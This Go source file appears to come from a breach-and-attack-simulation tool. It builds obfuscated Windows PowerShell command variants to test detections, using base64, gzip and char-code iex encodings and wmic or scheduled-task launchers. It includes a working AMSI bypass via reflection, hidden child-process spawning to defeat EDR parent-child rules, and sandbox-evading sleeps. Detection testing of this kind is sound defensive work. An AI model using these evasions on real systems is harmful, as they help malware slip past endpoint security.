package variant

import (
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"strings"
	"time"
	"unicode/utf16"
)

// defaultEvasions are the Phase 1 evasion wrappers — safe for all environments
// including regulated BFSI. They test timing and process-tree controls without
// any active memory manipulation.
var defaultEvasions = []string{
	EvasionNone, EvasionSleepJitter, EvasionDelay, EvasionParentShift,
}

// advancedEvasions are additional wrappers included only when includeAdvanced=true.
// AMSI bypass uses reflection to disable PS script scanning — many compliance
// teams classify this as offensive tradecraft. Never run by default.
var advancedEvasions = []string{
	EvasionAMSIPatch,
}

// Generate produces all valid Windows variant Templates for a base PowerShell
// command. Set includeAdvanced=true to add the Advanced Evasion Pack (AMSI bypass).
// Returns nil for non-PS/cmd executors or empty scripts.
func Generate(techniqueID, baseType, baseID, baseScript, executor string, includeAdvanced bool) []Template {
	if executor != "powershell" && executor != "cmd" {
		return nil
	}
	if baseScript == "" {
		return nil
	}

	evasions := make([]string, len(defaultEvasions))
	copy(evasions, defaultEvasions)
	if includeAdvanced {
		evasions = append(evasions, advancedEvasions...)
	}

	encodings := []string{EncPlain, EncBase64, EncGzipB64, EncCharCode}
	contexts := []string{CtxPowershellDirect, CtxCmdPowershell, CtxWMI, CtxSchedTask}
	now := time.Now().UTC()

	var out []Template
	for _, enc := range encodings {
		for _, ctx := range contexts {
			for _, ev := range evasions {
				cmd, agentExecutor, ok := buildCommand(baseScript, enc, ctx, ev, techniqueID, baseID)
				if !ok {
					continue
				}
				tid := TemplateID(techniqueID, baseID, enc, ctx, ev)
				out = append(out, Template{
					ID:          tid,
					TechniqueID: techniqueID,
					BaseType:    baseType,
					BaseID:      baseID,
					Encoding:    enc,
					ExecContext: ctx,
					Evasion:     ev,
					Platform:    "windows",
					Executor:    agentExecutor,
					Command:     cmd,
					RiskLevel:   assignRiskLevel(enc, ev),
					VariantHash: variantHash(tid),
					CreatedAt:   now,
				})
			}
		}
	}
	return out
}

// GenerateFromFamilies generates all variants for a slice of payload families.
// Each family provides a distinct PS script body; Generate() is called per family.
// Duplicate variant hashes (same dimensions, different families with identical content)
// are silently dropped.
func GenerateFromFamilies(techniqueID, baseType string, families []PayloadFamily, includeAdvanced bool) []Template {
	seen := make(map[string]bool)
	var out []Template
	for _, f := range families {
		exec := f.Executor
		if exec == "" {
			exec = "powershell"
		}
		for _, t := range Generate(techniqueID, baseType, f.Name, f.Payload, exec, includeAdvanced) {
			if !seen[t.VariantHash] {
				seen[t.VariantHash] = true
				out = append(out, t)
			}
		}
	}
	return out
}

// TemplateID returns a stable, deterministic composite ID for a variant.
func TemplateID(techniqueID, baseID, enc, ctx, ev string) string {
	return techniqueID + "|" + baseID + "|" + enc + "|" + ctx + "|" + ev
}

// VariantsPerFamily returns the number of valid variants generated per payload family
// for informational display. Call with includeAdvanced matching the intended run mode.
func VariantsPerFamily(includeAdvanced bool) int {
	// 4 enc × 4 ctx × N evasions − gzip/wmi exclusions − gzip/schedtask exclusions
	evCount := len(defaultEvasions)
	if includeAdvanced {
		evCount += len(advancedEvasions)
	}
	total := 4 * 4 * evCount
	total -= evCount // gzip + wmi excluded
	total -= evCount // gzip + schedtask excluded
	return total
}

// ── Internal ──────────────────────────────────────────────────────────────────

func buildCommand(baseScript, enc, ctx, ev, techniqueID, baseID string) (cmd, executor string, ok bool) {
	ps := applyEvasion(baseScript, ev)
	encoded, err := encodePS(ps, enc)
	if err != nil {
		return "", "", false
	}
	cmd, executor = wrapContext(encoded, enc, ctx, techniqueID, baseID)
	return cmd, executor, cmd != ""
}

// applyEvasion wraps or prepends an evasion snippet to the PS script body.
func applyEvasion(ps, ev string) string {
	switch ev {
	case EvasionSleepJitter:
		// Random 3–12s sleep — evades sandbox time-limited detonation.
		return `Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 12);` + " " + ps

	case EvasionDelay:
		// Fixed 5s delay — tests whether detections trigger only after activity starts.
		return `Start-Sleep -Seconds 5;` + " " + ps

	case EvasionParentShift:
		// Encode the technique script as UTF-16LE base64 and embed in Start-Process.
		// The execution context (cmd/wmi/schedtask) launches the outer PS; that PS
		// spawns a child powershell.exe via Start-Process — so the technique PS shows
		// powershell.exe as its parent, not cmd.exe or wmic.exe. Defeats parent-child
		// process tree rules used by many EDRs.
		inner := base64.StdEncoding.EncodeToString(encodeUTF16LE(ps))
		return fmt.Sprintf(
			`Start-Process powershell.exe -ArgumentList '-NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand %s' -Wait`,
			inner,
		)

	case EvasionAMSIPatch:
		// Patches amsiInitFailed via reflection — prevents AMSI from scanning the script.
		// Advanced Pack only: classified as offensive tradecraft by BFSI compliance teams.
		bypass := `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);`
		return bypass + " " + ps

	default: // EvasionNone
		return ps
	}
}

func encodePS(ps, enc string) (string, error) {
	switch enc {
	case EncPlain:
		return ps, nil
	case EncBase64:
		return base64.StdEncoding.EncodeToString(encodeUTF16LE(ps)), nil
	case EncGzipB64:
		var buf bytes.Buffer
		gz := gzip.NewWriter(&buf)
		if _, err := gz.Write([]byte(ps)); err != nil {
			return "", err
		}
		gz.Close()
		return base64.StdEncoding.EncodeToString(buf.Bytes()), nil
	case EncCharCode:
		return buildCharCode(ps), nil
	}
	return ps, nil
}

func encodeUTF16LE(s string) []byte {
	u := utf16.Encode([]rune(s))
	b := make([]byte, len(u)*2)
	for i, r := range u {
		b[i*2] = byte(r)
		b[i*2+1] = byte(r >> 8)
	}
	return b
}

func buildCharCode(s string) string {
	runes := []rune(s)
	codes := make([]string, len(runes))
	for i, r := range runes {
		codes[i] = fmt.Sprintf("%d", r)
	}
	return fmt.Sprintf("iex([char[]](%s)-join'')", strings.Join(codes, ","))
}

func wrapContext(encoded, enc, ctx, techniqueID, baseID string) (cmd, executor string) {
	switch ctx {
	case CtxPowershellDirect:
		switch enc {
		case EncBase64:
			return "powershell.exe -NoProfile -NonInteractive -EncodedCommand " + encoded, "cmd"
		case EncGzipB64:
			return `powershell.exe -NoProfile -NonInteractive -Command "` + escapePSInCmd(gzipDecompressExpr(encoded)) + `"`, "cmd"
		default:
			return encoded, "powershell"
		}

	case CtxCmdPowershell:
		switch enc {
		case EncBase64:
			return "cmd.exe /c powershell.exe -NoProfile -NonInteractive -EncodedCommand " + encoded, "cmd"
		case EncGzipB64:
			return `cmd.exe /c powershell.exe -NoProfile -NonInteractive -Command "` + escapePSInCmd(gzipDecompressExpr(encoded)) + `"`, "cmd"
		default:
			return `cmd.exe /c powershell.exe -NoProfile -NonInteractive -Command "` + escapePSInCmd(encoded) + `"`, "cmd"
		}

	case CtxWMI:
		var psInv string
		switch enc {
		case EncGzipB64:
			return "", "" // gzip quoting inside wmic is unreliable; skip
		case EncBase64:
			psInv = "powershell.exe -NoProfile -NonInteractive -EncodedCommand " + encoded
		default:
			psInv = `powershell.exe -NoProfile -NonInteractive -Command "` + escapeForWMI(encoded) + `"`
		}
		return `wmic.exe process call create "` + escapeForWMI(psInv) + `"`, "cmd"

	case CtxSchedTask:
		taskName := "BAS-V-" + variantShortHash(techniqueID, baseID, enc)
		var psInv string
		switch enc {
		case EncGzipB64:
			return "", "" // gzip quoting inside schtasks is unreliable; skip
		case EncBase64:
			psInv = "powershell.exe -NoProfile -NonInteractive -EncodedCommand " + encoded
		default:
			psInv = `powershell.exe -NoProfile -NonInteractive -Command "` + escapePSInCmd(encoded) + `"`
		}
		return fmt.Sprintf(
			`schtasks.exe /create /tn "%s" /tr "%s" /sc once /st 00:00 /f && schtasks.exe /run /tn "%s" && timeout /t 15 /nobreak >nul && schtasks.exe /delete /tn "%s" /f`,
			taskName, psInv, taskName, taskName,
		), "cmd"
	}
	return "", ""
}

// assignRiskLevel derives the risk classification for a variant combination.
// Encoding obfuscation = MODERATE; advanced evasion = ADVANCED; timing = SAFE.
func assignRiskLevel(enc, ev string) RiskLevel {
	if ev == EvasionAMSIPatch {
		return RiskAdvanced
	}
	if ev == EvasionParentShift || enc == EncBase64 || enc == EncGzipB64 || enc == EncCharCode {
		return RiskModerate
	}
	return RiskSafe
}

func gzipDecompressExpr(b64 string) string {
	return fmt.Sprintf(
		`$d=[Convert]::FromBase64String('%s');$ms=New-Object IO.MemoryStream(,$d);$gz=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress);iex(New-Object IO.StreamReader($gz)).ReadToEnd()`,
		b64,
	)
}

func escapePSInCmd(s string) string {
	return strings.ReplaceAll(s, `"`, `\"`)
}

func escapeForWMI(s string) string {
	return strings.ReplaceAll(s, `"`, `'`)
}

// variantHash returns a 16-char hex fingerprint of a template ID.
// Stored on variant_run_steps to deduplicate across families.
func variantHash(templateID string) string {
	h := sha256.Sum256([]byte(templateID))
	return hex.EncodeToString(h[:8])
}

// variantShortHash returns a 6-char hex for scheduled task names.
func variantShortHash(parts ...string) string {
	h := sha256.Sum256([]byte(strings.Join(parts, "|")))
	return hex.EncodeToString(h[:3])
}
